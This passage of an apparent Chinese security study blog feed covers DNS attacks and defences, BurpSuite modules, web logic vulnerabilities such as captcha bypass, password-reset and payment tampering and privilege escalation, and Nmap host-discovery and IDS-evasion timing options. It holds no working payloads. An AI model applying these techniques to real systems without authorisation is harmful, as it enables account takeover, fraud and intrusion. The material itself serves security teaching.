.localhost</li></ul></li><li>二级域名</li></ul><p><strong>区域和域：</strong></p><ul><li><p>域和子域都是概念上的划分，区域是实际物理意义上的划分，也就是根据权威域名服务器划分。</p></li><li><p>每个DNS区域至少有一个权威名称服务器，用于发布有关该区域的信息。它提供了DNS查询的原始和最终答案。权威名称服务器可以是主服务器（主服务器）或从服务器（辅助服务器）。主服务器存储所有区域记录的主副本，而从服务器使用自动更新机制来维护主记录的相同副本。</p></li><li><p>DNS区域仅包含域的一部分DNS数据。如果域未划分为子域，则区域和域本质上是相同的，因为区域包含域的所有DNS数据。当一个域被划分为子域时，它们的DNS数据仍然可以放在同一个区域中，因此域和区域仍然是相同的。但是子域可以有自己的区域。usa.example.com是一个域名，其子域为波士顿、纽约和芝加哥。为usa.example.com创建了两个区域。第一个包含芝加哥和波士顿子域，第二个包含NYC子域。</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202311291009809.png"alt="image-20231129094721563" /><figcaption aria-hidden="true">image-20231129094721563</figcaption></figure></li></ul><h2 id="dns解析过程">6.6.2 DNS解析过程</h2><p>DNS查询的结果通常会在本地域名服务器中进行缓存，如果本地域名服务器中有缓存的情况下，则会跳过如下DNS查询步骤，很快返回解析结果。下面的示例则概述了本地域名服务器没有缓存的情况下，DNS查询所需的8个步骤：</p><p>1、用户在Web浏览器中输入“example.com”，则由本地域名服务器开始进行递归查询。</p><p>2、本地域名服务器采用迭代查询的方法，向根域名服务器进行查询。</p><p>3、根域名服务器告诉本地域名服务器，下一步应该查询的顶级域名服务器.comTLD的IP地址。</p><p>4、本地域名服务器向顶级域名服务器.com TLD进行查询。</p><p>5、.comTLD服务器告诉本地域名服务器，下一步查询example.com权威域名服务器的IP地址。</p><p>6、本地域名服务器向example.com权威域名服务器发送查询。</p><p>7、example.com权威域名服务器告诉本地域名服务器所查询的主机IP地址。</p><p>8、本地域名服务器最后把查询的IP地址响应给Web浏览器。</p><p><strong>一旦DNS查询的8个步骤返回了example.com的IP地址，浏览器就能够发出对网页的请求：</strong></p><p><strong>9、浏览器向IP地址发出HTTP请求</strong></p><p><strong>10、该IP处的Web服务器返回要在浏览器中呈现的网页</strong></p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202311291009810.png"alt="image-20231129095007721" /><figcaption aria-hidden="true">image-20231129095007721</figcaption></figure><h2 id="本地dns文件">6.6.3 本地DNS文件</h2><ul><li>/etc/hosts：存储某些主机名的IP地址。在计算机联系本地DNS服务器之前，它首先在该文件中查找IP地址。</li><li>/etc/resolv.conf：向计算机的DNS解析器提供有关本地DNS服务器地址的信息。DHCP提供的本地DNS服务器的IP地址也存储在这里。</li></ul><h2 id="dns响应">6.6.4 DNS响应</h2><ul><li>问题部分：向名称服务器描述问题</li><li>回答部分：回答问题的记录</li><li>权威部分：指向权威名称服务器的记录</li><li>附加部分：与查询相关的记录</li></ul><p>DNS缓存：当本地DNS服务器从其他DNS服务器获取信息时，它会缓存该信息。缓存中的每一条信息都有一个生存时间值，最终将超时并从缓存中删除</p><h2 id="dns数据包">6.6.5 DNS数据包</h2><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202311291009811.png"alt="image-20231129095329850" /><figcaption aria-hidden="true">image-20231129095329850</figcaption></figure><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202311291009812.png"alt="image-20231129095336613" /><figcaption aria-hidden="true">image-20231129095336613</figcaption></figure><h2 id="dns攻击">6.6.6 DNS攻击</h2><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202311291009814.png"alt="image-20231129095920373" /><figcaption aria-hidden="true">image-20231129095920373</figcaption></figure><ul><li>拒绝服务攻击：使本地DNS服务器和权威名称服务器无法响应DNS查询</li><li>DNS欺骗：向受害者提供欺骗性IP地址，诱使他们与不同于他们意图的机器进行通信</li><li>受损机器：如果攻击者获得了机器的根权限，可以修改<code>/etc/resolv.conf</code>和<code>/etc/hosts</code></li><li>来自恶意DNS服务器的回复伪造攻击：恶意DNS服务器在AuthoritySection和Additional Section中提供伪造数据</li><li>反向DNS查找中的应答伪造：如果数据包来自攻击者，则反向DNS查找将返回到攻击者的名称服务器。攻击者可以使用他们想要的任何主机名进行回复。</li><li>DNS重新绑定攻击：通过修改DNS解析来绕过同源政策（Same-OriginPolicy）以访问受害者的敏感信息或执行恶意操作，因为虽然原始请求的域名与恶意内容的域名不同，但它们现在解析到同一个IP地址上，从而使浏览器认为它们是同源的。</li><li>DNS缓存中毒攻击：<ul><li>本地DNS缓存中毒攻击：在看到来自本地DNS的查询后伪造DNS应答(AnswerSection和Authority Section)</li><li>远程DNS缓存中毒攻击：需要猜测查询数据包使用的两个随机数，源端口号和事务ID。如果一次尝试失败，localDNS 将缓存实际回复；攻击者需要等待缓存超时以进行下一次尝试。</li></ul></li></ul><h2 id="防止dns缓存中毒攻击">6.6.7 防止DNS缓存中毒攻击</h2><ul><li>DNSSEC：对DNS数据提供身份验证和完整性检查。（数字签名机制）</li><li>TLS/SSL：服务器必须提供由受信任实体签名的公钥证书，并证明它是证书的所有者。</li></ul>]]></content>
    
    
    <categories>
      
      <category>网络攻防技术</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>BurpSuite</title>
    <link href="/2023/11/13/%E5%AE%89%E5%85%A8%E6%9C%8D%E5%8A%A1/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%B7%A5%E5%85%B7/BurpSuite/"/>
    <url>/2023/11/13/%E5%AE%89%E5%85%A8%E6%9C%8D%E5%8A%A1/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%B7%A5%E5%85%B7/BurpSuite/</url>
    
    <content type="html"><![CDATA[<h1 id="burp介绍">1. Burp介绍</h1><p><strong>简介：</strong></p><p>BurpSuite（简称Burp）是基于Java开发的Web安全领域的集成工具，被称为信息安全界的瑞士军刀，它包含Proxy、Intruder、Repeater、Decoder、Comparer等多个模块，模块间通过共享相互传递HTTP/HTTPS消息数据包。</p><p><strong>插件：</strong></p><p>BurpSuite可以使用三种语言编写的扩展插件：Java，Python和Ruby。除Java外，其它两种需要的扩展插件需要置运行环境。</p><h1 id="burp功能模块">2. Burp功能模块</h1><ul><li>Target：显示目标目录结构的一个功能</li><li>Proxy：Proxy以拦截代理的方式，拦截所有通过代理的HTTP和HTTPS协议的流量。通过拦截，BurpSuite以中间人的方式，可以对客户端请求数据、服务端返回做各种处理，以达到安全评估测试的目的。</li><li>lntruder：lntruder在原始请求数据的基础上，通过修改各种请求参数，以获取不同的请求应答。每一次请求中，Intruder通常会携带一个或多个有效攻击载荷，在不同的位置进行攻击重放，通过应答数据的比对分析来获得需要的特征数据。</li><li>Repeater：作为BurpSuite中一款手工验证HTTP消息的测试工具，Repeater通常用于多次重放请求响应和手工修改请求消息及修改后对服务器端响应的消息分析。</li><li>Sequencer：作为BurpSuite中一款用于检测数据样本随机性质量的工具，Sequencer通常用于检测访问令牌是否可预测、密码重置令牌是否可预测等场景，通过Sequencer的数据样本分析，能很好地降低这些关键数据被伪造的风险。</li><li>Decoder：作为BurpSuite中一款编码解码工具，Decoder的功能比较简单，它能对原始数据进行各种编码格式和散列的转换。</li><li>Comparer：Comparer在BurpSuite中主要提供一个可视化的差异比对功能，来对比分析两次数据之间的区别。</li></ul><h1 id="proxy模块">3. Proxy模块</h1><p><strong>HTTP报文抓取与修改：</strong></p><ol type="1"><li>设置BurpSuite代理服务端口</li><li>设置FireFox浏览器代理端口</li><li>抓取HTTP请求报文</li></ol><p><strong>HTTPS报文抓取与修改：</strong></p><ol type="1"><li>设置BurpSuite代理服务端口</li><li>设置FireFox浏览器代理端口</li><li>下载CA证书<code>http://burp</code></li><li>浏览器中导入CA证书</li><li>抓取HTTPS请求报文</li></ol><h1 id="repeater模块">4. Repeater模块</h1><ul><li>修改请求参数，验证输入的漏洞</li><li>修改请求参数，验证逻辑越权</li><li>从拦截历史记录中，捕获特征性的请求消息进行请求重放</li></ul><h1 id="intruder模块">5. Intruder模块</h1><p><strong>攻击模式：</strong></p><ul><li>狙手模式（Sniper）：单payload位置，单payload集合，简单替换，若有多个payload位置，则会在每一个位置上遍历一次payload集合。</li><li>攻城锤模式（Batteringram）：多payload位置，单payload集合，在多个位置上使用相同的payload。</li><li>草叉模式（Pitchfork)︰多payload位置，多payload集合，在每个payload位置上遍历对应的payload集合，攻击次数为最短的payload集合的元素个数。</li><li>集束炸弹模式（Clusterbomb）：多payload位置，多payload集合，以多个payload集合的笛卡尔积作为攻击序列。如第一个位置的payload集合是{A,B}，第二格位置的payload集合是{C,D}，则攻击序列为{&lt;A,C&gt;，&lt;A,D&gt;,&lt;B,C&gt;，B,D&gt;}</li></ul><p><strong>payload类型:</strong></p><ul><li>简单列表（Simplelist）：最简单的payload类型，配置一个字符串列表作为payload，也可以手工添加字符串列表或从文件加载字符串列表。</li><li>运行时文件（Runtimefile）：指定文件，作为相对应payload位置上的payload列表。</li><li>自定义迭代器(Customiterator)：它共有8个占位，每个占位可以定义一个简单列表，最终所使用的payload为每一个占位的简单列表的笛卡儿积。</li><li>字符串替换（Charactersubstitution)：对预定义的字符串进行“枚举替换”后生成新的payload。</li><li>递归提取(Recursivegrep）：从服务器端提取有效数据的场景，需要先从服务器的响应中提取数据作为payload，然后替换payload的位置，进行攻击。递归的配置需要进入Options-&gt;Grep-&gt;Extract进行配置；使用该模式时，线程数必须为1。</li><li>字符块（Characterblocks）︰：使用一个给出的输入字符串，根据指定的设置产生指定大小的字符块，表现形式为生成指定长度的字符串。</li><li>数字类型（Number)：根据配置，生成一系列的数字作为payload。</li><li>日期类型（Dates）:根据配置，生成一系列的日期。</li><li>暴力字典（Bruteforcer）:生成包含一个指定的字符集的所有排列特定长的有效载荷，通常用于枚举字典的生成。</li><li>空类型(Null payloads）︰产生的payload其值是一个空字符串。</li><li>payload复制（Copy otherpayload）:这种类型的payload是将其他位置的参数复制到payload位置上。</li></ul><p><strong>Option子选项卡：</strong></p><ul><li>请求消息头设置(Request Headers）</li><li>请求引擎设置（Request Engine)</li><li>攻击结果设置（Attack Results）</li><li>正则匹配（Grep Match)</li><li>正则提取（Grep Extract)</li><li>正则匹配payload（Grep payloads）</li><li>重定向(Redirections）</li></ul>]]></content>
    
    
    <categories>
      
      <category>安全服务</category>
      
      <category>渗透测试工具</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>逻辑漏洞</title>
    <link href="/2023/11/13/%E5%AE%89%E5%85%A8%E6%9C%8D%E5%8A%A1/Web%E6%B8%97%E9%80%8F/%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E/"/>
    <url>/2023/11/13/%E5%AE%89%E5%85%A8%E6%9C%8D%E5%8A%A1/Web%E6%B8%97%E9%80%8F/%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E/</url>
    
    <content type="html"><![CDATA[<h1 id="逻辑漏洞">0. 逻辑漏洞</h1><h2 id="访问控制概述">0.1 访问控制概述</h2><ul><li>访问控制(AccessControl）指系统对用户身份及其所属的预先定义的策略组限制其使用数据资源能力的手段。通常用于系统管理员控制用户对服务器、目录、文件等网络资源的访问。访问控制是系统保密性、完整性、可用性和合法使用性的重要基础，是网络安全防范和资源保护的关键策略之一，也是主体依据某些控制策略或权限对客体本身或其资源进行的不同授权访问。</li><li>三要素：<strong>主体、客体、访问策略</strong></li><li>主体访问客体通常需要4个步骤：<strong>身份标识、身份验证、授权、审计</strong></li><li>访问控制模型：<ul><li>自主访问控制（Discretionary AccessControl，DAC，大部分使用）：由客体的属主自主的对客体进行管理，自主的决定是否将访问权限授予其他主体。</li><li>强制访问控制(Mandatory AccessControl，MAC)：安全策略由管理员配置，访问控制由系统实施，安全策略高于一切的存在。</li><li>角色型访问控制（Role-BasedAccessControl，RBAC）：根据不同的职位来分配不同的角色</li></ul></li></ul><h2 id="逻辑漏洞概述">0.2 逻辑漏洞概述</h2><ul><li>相比SQL注入、XSS漏洞等传统安全漏洞，SQL注入、XSS等漏洞可以通过安全框架等避免，并且攻击流量非法，对原始程序进行了破坏，防火墙可以检测;所以现在的攻击者更倾向于利用业务逻辑层的应用安全问题。</li><li>逻辑漏洞就是指攻击者利用业务的设计缺陷，获取敏感信息或破环业务的完整性。</li><li>由于逻辑漏洞产生的流量多数为合法流量，传统的安全防御设备和措施收效甚微，一般的防护手段或设备无法阻止。</li></ul><h2 id="逻辑漏洞分类">0.3 逻辑漏洞分类</h2><ul><li>验证机制缺陷</li><li>会话管理缺陷</li><li>权限管理缺陷</li><li>业务逻辑缺陷</li></ul><h1 id="验证机制">1. 验证机制</h1><h2 id="概述">1.1 概述</h2><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202311032007386.png"alt="image-20231103151202542" /><figcaption aria-hidden="true">image-20231103151202542</figcaption></figure><ul><li>验证机制是应用程序防御恶意攻击的<strong>中心机制</strong>。验证机制最常见的方式是信息系统要求用户提交用户名与密码，正确则允许用户登录，错误则拒绝用户登录。</li></ul><h2 id="验证机制设计缺陷">1.2 验证机制设计缺陷</h2><ul><li><p>可预测的用户名</p></li><li><p>非唯一性用户名</p></li><li><p>弱口令</p></li><li><p>密码确认不完善</p></li><li><p>可预测的密码</p></li><li><p>暴力破解</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202311032007388.png"alt="image-20231103152006342" /><figcaption aria-hidden="true">image-20231103152006342</figcaption></figure><ul><li><p>页面在设置用户名和密码的时候，没有遵循密码设置规则，使用字典暴力破解，对暴破的结果根据长度进行分析，长度值与其他不同的就是正确结果，从而绕过登录验证机制</p></li><li><p>在遇到登录页面增加有验证码验证，首先判断是前端验证还是后端验证，前端设置的验证码如同虚设，就可以略过验证码，直接使用字典暴力破解（验证码输入错误时，无法抓取到数据包，只有验证码输入正确时才能抓到数据包，由此可以判断验证码的验证逻辑在前端；或直接查看页面源码）</p></li><li><p>服务端验证码常见问题：</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs">1、验证码不生效，导致验证码的验证逻辑无效<br>2、验证码不过期，导致验证码不失效，可以长期使用<br>3、验证码设计太简单以及有规律，可以被预测、猜解<br>4、验证码校验不严格，验证逻辑出现问题<br></code></pre></td></tr></table></figure></li></ul></li><li><p>密码重置(修改密码、找回密码)</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-regexp">//</span>常见密码重置问题:<br><span class="hljs-number">1</span>、用户名枚举：网站反馈多余信息，可猜测用户信息<br><span class="hljs-number">2</span>、验码返回前端处理：可截获、修改<br><span class="hljs-number">3</span>、修改Request：用户名、手机号、邮箱、Cookie等信息可修改<br><span class="hljs-number">4</span>、修改Response：操作结果成功/失败可修改<br><span class="hljs-number">5</span>、暴力破解验证码：验证码长度有限，或验证码未设置可靠的失效时间<br><span class="hljs-number">6</span>、拼凑密码重置链接：重置密码链接有规可循<br></code></pre></td></tr></table></figure></li><li><p>记住密码</p></li><li><p>证书分配不安全</p></li><li><p>证书传输易受攻击</p></li></ul><h2 id="验证机制执行缺陷">1.3 验证机制执行缺陷</h2><ul><li>异常开放登录机制</li><li>多阶段登录机制中的缺陷</li></ul><h1 id="会话管理">2. 会话管理</h1><h2 id="会话令牌">2.1 会话令牌</h2><ul><li>会话：用户登录成功后为其建立一个会话，通过会话记录用户的各种状态，通常使用Cookie、Session及Token实现会话机制。</li><li>cookie的属性值expires，就是用于设置cookie过期时间，如果设置一个时间，到期后cookie则失效，如果默认不设置，则为浏览器关闭后cookie失效。</li><li>执行会话最简单、最常见的方式是向每名用户发布一个唯一的会话令牌或标识符，用户在每一个请求中提交这个令牌。</li></ul><h2 id="令牌有含义">2.2 令牌有含义</h2><p>我们常规抓取http数据包所观察到的令牌内容多是杂乱无序的字符串，不同用户之 间的令牌也无任何规律。但是也不排除有些系统会有意设置具有含义的令牌字符。</p><h2 id="令牌可预测">2.3 令牌可预测</h2><ul><li>隐含序列</li><li>时间依赖</li><li>生成的数字随机性不强</li><li>令牌加密函数对外开放或暴露</li></ul><h2 id="令牌可获取">2.4 令牌可获取</h2><ul><li>在网络上泄露令牌：使用HTTP协议</li><li>在日志中泄露令牌：协助网络管理人员的系统日志如果记录了最近的会话日志，且未对访问控制进行严格管理，那么在此种情况下，攻击者可能通过日志获得登录会话</li><li>会话令牌与会话的映射易受到攻击：运行并行登录；使用静态令牌，即一个用户令牌发布后不再改变</li><li>客户端暴露在令牌劫持风险中：<strong>XSS；CSRF；会话固定</strong></li></ul><h2 id="令牌不失效">2.5 令牌不失效</h2><ul><li>令牌有效期过长</li><li>令牌尝试次数过多</li><li>无效的令牌重置的手段</li></ul><h2 id="会话管理问题">2.6 会话管理问题</h2><p>cookie的属性值expires，就是用于设置cookie过期时间，如果设置一个时间，到期后cookie则失效，如果默认不设置，则为浏览器关闭后cookie失效。</p><h1 id="权限控制">3. 权限控制</h1><h2 id="概述-1">3.1 概述</h2><ul><li>定义：某个主体(subject)对某个客体（object)需要实施某种操作（operation），系统对这种操作的限制就是权限控制。</li><li>权限控制一般分为两个步骤：<strong>身份验证</strong>与<strong>授权</strong>。首先进行的是身份验证的工作，用于验证用户是谁，是否有资格登录访问系统，解决【Whoaml】的问题;第二步进行授权，用来决定用户能做什么，将系统不同的权限授予不同的账户，使其登录系统后拥有不同的操作权限，解决【Whatcan l do】的问题。</li><li>权限控制方式：<ul><li>ACL：访问控制列表</li><li>RBAC：基于角色的访问控制</li></ul></li><li>权限控制问题：<ul><li>未授权访问</li><li>越权访问</li></ul></li></ul><h2 id="未授权访问">3.2 未授权访问</h2><h3 id="概述-2">3.2.1 概述</h3><ul><li><p>当信息系统的安全配置或权限认证的地址、授权页面存在缺陷时，有可能出现未授权访问，导致用户可以访问信息系统，进而操作重要权限、操作数据库、读取网站目录等敏感信息。</p></li><li><p>对于Web应用程序，未授权访问常发生于空口令登录及后台管理页面的访问；对于数据库或一些服务组件，未授权访问可能由于一些版本中出现的漏洞，导致攻击者能读取数据库信息，读取系统的文件，甚至利用服务写文件至主机上。</p></li></ul><h3 id="解决方案">3.2.2 解决方案</h3><ul><li>隐藏:只能阻止用户无法猜测到后台界面，爆破工具可以扫描大量后台地址</li><li>页面权限控制:可以阻挡非认证用户登录后台，即使找到后台链接，也会被认证窗口阻拦</li></ul><h2 id="越权访问">3.3 越权访问</h2><ul><li><p>由于服务器端对客户提出的数据操作请求过分信任，忽略了对该用户操作权限的判定，导致修改相关参数就可以拥有了其他账户的增、删、查、改功能，从而导致越权漏洞。</p></li><li><p>按数据库操作分类：</p><ul><li>越权查询</li><li>越权删除</li><li>越权修改</li><li>越权添加</li></ul></li><li><p>按维度分类：</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202311032007389.png"alt="image-20231103171404099" /><figcaption aria-hidden="true">image-20231103171404099</figcaption></figure><ul><li>平行越权(权限类型不变，权限ID改变)：攻击者尝试访问与其具有相同级别的用户资源</li><li>垂直越权(权限ID不变，权限类型改变)：低级别攻击者尝试访问高级别用户的资源</li><li>交叉越权（权限类型改变，权限ID也改变)</li></ul></li></ul><h3 id="水平越权">3.3.1 水平越权</h3><ul><li>水平越权也叫横向越权，相同权限下不同的用户可以互相访问，比如A和B是相同权限下的用户，如果A能看到理论上只有B能看到的信息，或者A能执行理论上只有B能执行的操作，这就是水平越权。</li><li>实例：使用lucy账户登录，查看lucy用户的个人信息，通过修改username的值为其他用户名，实现查看其他用户的个人信息，成功水平越权。</li></ul><h3 id="垂直越权">3.3.2 垂直越权</h3><ul><li>垂直越权也叫纵向越权，使用权限低的用户可以访问到权限较高的用户。比如A用户权限比B低，如果A可以访问理论上只有B才能访问的资源，或者执行理论上B才能执行的操作，这就是垂直越权。</li><li>垂直越权原理为高权限角色访问低权限角色的资源往往是被允许的，低权限角色访问高权限角色资源是被禁止的，如果低权限角色通过访问URL、修改标识、遍历参数等方法获得了更高权限角色的能力，这样就发生了垂直越权访问。</li></ul><h3 id="解决方案-1">3.3.3 解决方案</h3><ul><li>垂直越权：设置合适的会话管理机制，在每个涉及到高权限操作的页面进行会话验证</li><li>水平越权：<ul><li>设置合理的会话管理机制，将有关用户的标识存在服务器上</li><li>涉及到关于用户隐私的操作时，从session中取出用户标识(如id）进行操作</li><li>不要轻信用户的每个输入越权</li></ul></li></ul><h1 id="业务逻辑">4. 业务逻辑</h1><h2 id="概述-3">4.1 概述</h2><ul><li>不同的项目有不同的功能，不同的功能需要不同的实现，实现这些核心功能的代码就叫业务逻辑。</li><li>业务是指一个实体单元向另一个实体单元提供的服务。逻辑是指根据已有的信息推出合理的结论的规律。业务逻辑是指一个实体单元为了向另一个实体单元提供服务，应该具备的规则与流程。</li><li>内容：<ul><li>领域实体:定义了业务中的对象，对象有属性和行为</li><li>业务规则:定义了需要完成一个动作，必须满足的条件</li><li>数据完整性:某些数据不可少</li><li>工作流:定义了领域实体之间的交互关系</li></ul></li><li>业务逻辑漏洞：是指由于程序逻辑不严谨或逻辑太复杂，导致一些逻辑分支不能正常处理或处理错误。</li></ul><h2 id="支付逻辑漏洞">4.2 支付逻辑漏洞</h2><ul><li>支付逻辑漏洞是指系统的支付流程中存在业务逻辑层面的漏洞。支付漏洞一直以来就是高风险漏洞，对用户和企业的危害都很大。网上购物的整体流程为：搜索-&gt; 挑选商品 -&gt; 下单购买 -&gt; 付款 -&gt;发货。在系统的支付流程中，由于开发者在编写购物程序时，对客户端请求数据中金额、单价、数量、商品编号等敏感信息的逻辑处理不当，攻击者利用目标网站本身的逻辑问题，造成商家的经济损失，导致产生支付逻辑漏洞。常见情况：<ul><li>支付过程中修改支付金额</li><li>支付过程中修改商品数量</li><li>支付过程中修改商品编号</li><li>支付过程中修改商品单价</li></ul></li><li>预防思路：多重校验；人工审核（大金额订单）</li></ul><h2 id="其他业务逻辑问题">4.3 其他业务逻辑问题</h2><ul><li><p>APl逻辑漏洞：参数校验不完善；短信、邮箱炸弹；关键参数不加密</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202311032007390.png"alt="image-20231103174441951" /><figcaption aria-hidden="true">image-20231103174441951</figcaption></figure></li><li><p>客户端与API通信无加密：未加密风险；中间人攻击</p></li><li><p>客户端与API通信无身份验证：信息泄露；应用程序被克隆；难以应对大规模拒绝服务攻击</p></li><li><p>其他安全问题：短信炸弹；重复下单（均属于重复攻击模式）</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202311032007391.png"alt="image-20231103174840365" /><figcaption aria-hidden="true">image-20231103174840365</figcaption></figure></li></ul>]]></content>
    
    
    <categories>
      
      <category>安全服务</category>
      
      <category>Web渗透</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>Nmap(扩展篇)</title>
    <link href="/2023/11/13/%E5%AE%89%E5%85%A8%E6%9C%8D%E5%8A%A1/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%B7%A5%E5%85%B7/Nmap(%E6%89%A9%E5%B1%95%E7%AF%87)/"/>
    <url>/2023/11/13/%E5%AE%89%E5%85%A8%E6%9C%8D%E5%8A%A1/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%B7%A5%E5%85%B7/Nmap(%E6%89%A9%E5%B1%95%E7%AF%87)/</url>
    
    <content type="html"><![CDATA[<h1 id="简介">1 简介</h1><h2 id="概述">1.1 概述</h2><p><code>Nmap</code>（“ Network Mapper”）是一个用于网络探测和安全审计的开源工具。它被设计用于快速扫描大型网络，尽管它对于单个主机也能正常工作。<code>Nmap</code>以新颖的方式使用原始<code>IP</code>数据包来确定网络上可用的主机、这些主机提供的服务（应用程序名称和版本）、它们运行的操作系统及其版本、正在使用中的数据包过滤器/防火墙的类型，以及数十个其他特性。</p><h2 id="功能">1.2 功能</h2><ul><li>主机发现</li><li>端口扫描</li><li>服务和版本检测</li><li>推断主机所用的操作系统</li></ul><h2 id="常见用法">1.3 常见用法</h2><ul><li><p><code>-iL</code> <inputfilename>(从列表中输入)：可将文件中的一堆主机名或地址读取出来进行扫描。</p></li><li><p><code>-iR</code> <hostnum>(随机选择目标)：可以指定随机生成多少个<code>IP</code>地址。如果为0，意味着无休止的扫描。</p></li><li><p><code>–exclude</code>：可以排除多个不需要扫描的主机。</p></li><li><p><code>–excludfile</code> <excludefile>(排除文件中的列表)：排除文件中的主机列表</p></li></ul><h2 id="时序">1.4 时序</h2><ul><li>-T0 偏执的：非常非常慢，用于IDS逃逸</li><li>-T1 猥琐的：相当慢，用于IDS逃逸</li><li>-T2 有礼貌的：降低速度以消耗更小的带宽，比默认慢十倍</li><li>-T3 普通的：默认，根据目标的反应自动调整时间模式</li><li>-T4 野蛮的：假定处在一个很好的网络环境，请求可能会淹没目标</li><li>-T5 疯狂的：非常野蛮，很可能会淹没目标端口或是漏掉一些开放端口</li></ul><h1 id="主机发现">2 主机发现</h1><p><code>Nmap</code>会根据当前扫描的网络来改变它的扫描方式：</p><ul><li>本地网络发送 <code>ARP</code>数据包；</li><li>非本地网路依次发送：A) <code>ICMP echo</code>请求；B)<code>TCP SYN</code> 到端口 443；C) <code>TCP ACK</code>到端口 80；D)<code>ICMP timestap</code>请求。</li></ul><h2 id="sl列表扫描">2.1 -sL(列表扫描)</h2><p>列表扫描是主机发现的一种退化形式，它仅列出指定网络的每个主机，而不向目标主机发送任何数据包，即<strong>不进行主机发现</strong>。默认情况下，<code>Nmap</code>仍然在主机上执行<code>反向 DNS 解析</code>（<code>IP</code>→<code>域名</code>）以了解其名称。<code>Nmap</code>还在末尾报告<code>IP</code>地址的总数。由于这个想法是简单地打印目标主机列表，因此端口扫描、操作系统检测或主机发现等更高级别功能的选项不能与此结合。</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202309281048776.png"alt="image-20230924112236211" /><figcaption aria-hidden="true">image-20230924112236211</figcaption></figure><h2 id="sn无端口扫描">2.2 -sn(无端口扫描)</h2><p>该选项告诉<code>Nmap</code>在主机发现后不要进行端口扫描，而只打印出响应主机发现探测的可用主机。默认情况下，完成的默认主机发现<code>-sn</code>由<code>ICMP</code> 回显请求、端口 443 的<code>TCP SYN</code>、端口 80的<code>TCP ACK</code>以及<code>ICMP</code>时间戳请求组成。当由非特权用户执行时，仅将 SYN数据包发送（使用调用<code>connect</code>）到目标上的端口 80 和443。当特权用户尝试扫描本地以太网上的目标时，除非<code>--send-ip</code>指定，否则将使用<code>ARP</code>请求。该<code>-sn</code>选项可以与任何发现探测类型（<code>-P*</code>选项）以获得更大的灵活性。如果使用任何这些探测类型和端口号选项，则默认探测将被覆盖。当运行<code>Nmap</code>的源主机和目标网络之间存在严格的防火墙时，建议使用这些高级技术。否则，当防火墙丢弃探测或其响应时，主机可能会丢失。只利用ping扫描进行主机发现，不扫描目标主机的端口。在<code>Nmap</code>的早期版本中，<code>-sn</code>被称为<code>-sP</code>。·</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202309281048778.png"alt="image-20230924114006070" /><figcaption aria-hidden="true">image-20230924114006070</figcaption></figure><h2 id="pn无-ping">2.3 -Pn(无 ping)</h2><p>该选项完全跳过主机发现阶段。通常情况下，<code>Nmap</code>使用此阶段来确定活动机器，以便进行更大规模的扫描，并衡量网络速度。与列表扫描一样，会跳过正确的主机发现，但<code>Nmap</code>不会停止并打印目标列表，而是继续执行请求的功能，就好像每个目标<code>IP</code>都处于活动状态一样。默认情况下，<code>Nmap</code>只对发现运行的主机执行重型探测，如端口扫描、版本检测或操作系统检测。对于本地以太网上的机器，仍然会执行<code>ARP</code> 扫描（除非指定<code>--disable-arp-ping</code>或<code>--send-ip</code>），因为<code>Nmap</code>需要 MAC 地址来进一步扫描目标主机。在<code>Nmap</code>的早期版本中，<code>-Pn</code>是 <code>-P0</code> 和<code>-PN</code>。</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202309281048779.png"alt="image-20230925152253035" /><figcaption aria-hidden="true">image-20230925152253035</figcaption></figure><h2 id="ps-tcp-syn-ping">2.4 -PS <port list>(TCP SYN Ping)</h2><p>该选项会发送一个设置了<code>SYN</code>标志的空 TCP数据包。默认目标端口为 80。SYN标志向远程系统表明，您正试图建立连接。通常情况下，目标端口会被关闭，并回发一个<code>RST</code>（重置）数据包。如果端口碰巧是开放的，目标系统将采取TCP 三方握手的第二步，回应一个 <code>SYN/ACK</code> TCP数据包。然后，运行 <code>Nmap</code> 的机器会以 <code>RST</code>回应，而不是发送 <code>ACK</code>数据包（<code>ACK</code>数据包将完成三方握手并建立完整连接）来破坏新生连接。<code>Nmap</code>不关心端口是打开还是关闭。前面讨论的 <code>RST</code> 或<code>SYN/ACK</code>响应告诉 <code>Nmap</code>主机可用且有响应。注意：-PS和端口列表间无空格。</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202309281048780.png"alt="image-20230925152824970" /><figcaption aria-hidden="true">image-20230925152824970</figcaption></figure><h2 id="pa-tcp-ack-ping">2.5 -PA <port list>(TCP ACK Ping)</h2><p><code>TCP ACK ping</code> 与刚才讨论的 SYN ping非常相似。两者的区别在于设置的是 <code>TCP ACK</code> 标志，而不是<code>SYN</code>标志。同时提供<code>SYN</code> 和 